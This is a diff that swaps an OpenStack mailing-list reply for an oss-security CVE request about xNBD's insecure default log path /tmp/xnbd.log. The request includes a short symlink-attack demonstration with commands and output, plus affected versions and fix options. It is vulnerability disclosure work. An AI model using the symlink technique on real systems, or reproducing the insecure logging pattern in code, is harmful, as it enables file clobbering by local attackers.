@@ -1,28 +1,93 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/06/03/7
-Message-ID: <20130603182437.GM1472@yuggoth.org>
-Date: Mon, 3 Jun 2013 18:24:39 +0000
-From: Jeremy Stanley <fungi@...goth.org>
-To: oss-security@...ts.openwall.com, openstack@...ts.launchpad.net
-Subject: Re: [OSSA 2013-013] Keystone client local information disclosure (CVE-2013-2013)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/02/06/2
+Message-ID: <5112897B.4040603@pipping.org>
+Date: Wed, 06 Feb 2013 17:48:59 +0100
+From: Sebastian Pipping <sebastian@...ping.org>
+To: oss-security@...ts.openwall.com
+Subject: CVE request: Insecure default log file path in xNBD
 Content-Type: text/plain; charset=utf-8
 
-On 2013-06-03 10:51:19 -0700 (-0700), Lloyd Dewolf wrote:
-[...]
-> Interestingly, the OSSA 2013-014 notice did include
-> "python-keystoneclient fix (will be included in upcoming 0.2.4
-> release)".
+Hello oss-security!
 
-I'm going to chalk that up to Thierry knowing the version number at
-that point, since the OSSA 2013-014 fix is what got tagged with
-0.2.4 the next morning. On the other hand the -013 fix was a
-lower-priority feature enhancement and I didn't want to rely on a
-versioning guess a week ahead. Client releases are handled a bit
-more independently compared to OpenStack server components (where we
-can predict release milestone dates fairly accurately).
 
-As a general rule I'm going to try to include the release version
-numbers in advance when I can do so safely, and otherwise rely on
-subsequent release announcements.
--- 
-Jeremy Stanley
+Target software
+===============
+
+xNBD upstream
+   https://bitbucket.org/hirofuchi/xnbd
+
+Official Debian packages
+   http://packages.debian.org/sid/xnbd-server
+
+
+Description
+===========
+
+xnbd-server (and xnbd-wrapper in some releases) use /tmp/xnbd.log
+for logging when parameter --daemonize (and no --logpath FILE) is given.
+
+The file is opened using flags O_WRONLY | O_CREAT | O_APPEND so there
+is a vulnerability against symlinks attacks.
+
+
+Demonstration
+=============
+
+Here is an exploitation example:
+
+   $ ln -s "${HOME}"/ATTACK_TARGET /tmp/xnbd.log
+
+   $ touch DISK
+   $ truncate --size=$((100*1024**2)) DISK
+
+   $ /usr/sbin/xnbd-server --daemonize --target DISK
+   xnbd-server(12462) msg: daemonize enabled
+   xnbd-server(12462) msg: cmd target mode
+   xnbd-server(12462) msg: disk DISK size 104857600 B (100 MB)
+   xnbd-server(12462) msg: xnbd master initialization done
+   xnbd-server(12462) msg: logfile /tmp/xnbd.log
+
+   $ ls -l ~/ATTACK_TARGET
+   -rw------- 1 user123 user123 653 Feb  1 16:41 \
+     /home/user123/ATTACK_TARGET
+
+
+Affected versions
+=================
+
+The latest code in the upstream Mercurial repository is not affected
+since it does not use logging to /tmp/xnbd.log (or any default
+location) any more.
+
+----------------------------------------------------------------------
+   Version                        Status
+----------------------------------------------------------------------
+   0.0.x                          not analyzed
+   0.1.0-pre                      VULNERABLE (xnbd-server only)
+   0.1.0-pre-hg20-e75b93a47722-2  VULNERABLE (xnbd-server and -wrapper)
+   Mercurial tip                  not vulnerable
+----------------------------------------------------------------------
+
+
+Options for a fix
+=================
+
+  a) Use syslog with --daemonize and no default file location in general
+     (i.e. what upstream did)
+
+  b) Use /var/log/xnbd-server.log and /var/log/xnbd-wrapper.log
+     for the hard-coded defaults
+
+  c) Replace flag O_APPEND by O_EXCL  (secure but reducing functionality)
+
+The attached patch applies approach (b) to version 
+0.1.0-pre-hg20-e75b93a47722.
+
+
+Best,
+
+
+
+Sebastian
+
+View attachment "xnbd-0.1.0-pre-hg20-e75b93a47722-insecure-logging-location.patch" of type "text/x-patch" (6162 bytes)
